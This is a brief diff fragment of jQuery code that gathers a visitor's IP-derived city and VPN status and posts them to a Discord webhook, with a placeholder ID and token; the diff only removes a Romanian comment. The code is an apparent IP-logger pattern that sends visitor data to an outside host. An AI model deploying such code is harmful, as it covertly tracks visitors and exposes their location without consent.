@@ -7,7 +7,6 @@ $(document).ready(function () {
                          + 'City: ' + ipData.city + '\n'
                          + 'VPN: ' + (ipData.usingVPN === true ? 'Detected' : 'Not Detected');
 
-            // Trimite mesajul la un webhook Discord
             $.ajax({
                 url:  "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
                 type: 'POST',
